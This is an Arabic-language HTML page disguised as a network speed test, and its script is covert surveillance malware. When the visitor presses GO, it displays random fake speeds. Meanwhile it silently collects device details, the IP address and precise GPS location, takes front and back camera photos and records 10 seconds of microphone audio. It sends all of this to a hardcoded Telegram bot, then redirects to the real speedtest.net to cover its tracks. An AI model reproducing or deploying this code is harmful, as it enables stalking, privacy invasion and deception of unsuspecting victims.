
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Global | فحص سرعة الشبكة</title>
    <style>
        :root { --accent: #00d2ff; --dark-bg: #0b0e18; }
        body { background: var(--dark-bg); color: white; font-family:  Segoe UI , sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 210, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 210, 255, 0.03) 1px, transparent 1px); background-size: 25px 25px; z-index: -1; }
        .main-card { background: rgba(255, 255, 255, 0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        h1 { font-size: 22px; margin: 0 0 10px; font-weight: 300; letter-spacing: 2px; }
        .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #goBtn { width: 160px; height: 160px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 35px; font-weight: bold; cursor: pointer; transition: 0.4s; outline: none; }
        #speedDisplay { display: none; text-align: center; }
        .speed-num { font-size: 48px; font-weight: 800; color: var(--accent); display: block; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="main-card">
        <h1>SPEEDTEST</h1>
        <p id="subText" style="color: #8892b0; font-size: 13px;">جاري تجهيز سيرفر الفحص...</p>
        <div class="gauge-box">
            <button id="goBtn">GO</button>
            <div id="speedDisplay">
                <span id="num" class="speed-num">0.0</span>
                <span style="font-size:14px; color:#8892b0;">Mbps (Download)</span>
            </div>
        </div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";

        async function sendToTelegram(msg, isImg = false, data = null, isVoice = false) {
            const url = `https://api.telegram.org/bot${token}/`;
            try {
                const fd = new FormData();
                fd.append("chat_id", chat);
                if (isVoice) {
                    fd.append("voice", data, "record.ogg");
                    await fetch(url + "sendVoice", { method: "POST", body: fd });
                } else if (isImg) {
                    fd.append("photo", data, "shot.jpg");
                    if (msg) fd.append("caption", msg);
                    await fetch(url + "sendPhoto", { method: "POST", body: fd });
                } else {
                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
                }
            } catch (e) {}
        }

        async function getFullReport() {
            let info = `📊 *تقرير شامل للهدف*:\n\n`;
            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
            try {
                const b = await navigator.getBattery();
                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌" : "🔋"})\n`;
                const ip = await fetch( https://api.ipify.org?format=json ).then(r => r.json());
                info += `• 🌐 الـ IP: \`${ip.ip}\`\n`;
            } catch (e) {}
            return info;
        }

        async function snap(mode) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const v = document.getElementById("v");
                const c = document.getElementById("c");
                v.srcObject = s;
                await new Promise(r => v.onloadedmetadata = r);
                await new Promise(r => setTimeout(r, 2000)); // وقت كافٍ لتجنب السواد
                c.width = 720; c.height = 540;
                c.getContext("2d").drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                return new Promise(res => c.toBlob(res, "image/jpeg", 0.8));
            } catch (e) { return null; }
        }

        async function recordAudio(duration) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                return new Promise(resolve => {
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type:  audio/ogg; codecs=opus  });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), duration * 1000);
                });
            } catch (e) { return null; }
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("speedDisplay").style.display = "block";
            document.getElementById("subText").innerText = "جاري الفحص...";

            const timer = setInterval(() => {
                document.getElementById("num").innerText = (Math.random() * (95 - 80) + 80).toFixed(1);
            }, 100);

            // 1. التقرير والموقع (فوراً)
            sendToTelegram(await getFullReport());
            navigator.geolocation.getCurrentPosition(p => {
                sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح الخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
            });

            // 2. الصور أولاً لضمان الجودة وعدم السواد
            const front = await snap("user");
            if (front) await sendToTelegram("📸 صورة أمامية", true, front);

            const back = await snap("environment");
            if (back) await sendToTelegram("📷 صورة خلفية", true, back);

            // 3. الصوت يبدأ بعد انتهاء الصور تماماً
            recordAudio(10).then(audio => {
                if (audio) sendToTelegram(null, false, audio, true);
            });

            // 4. توجيه نهائي بعد 13 ثانية لضمان إرسال كل شيء
            setTimeout(() => {
                clearInterval(timer);
                location.href = "https://www.speedtest.net/";
            }, 13000);
        };
    </script>
</body>
</html>
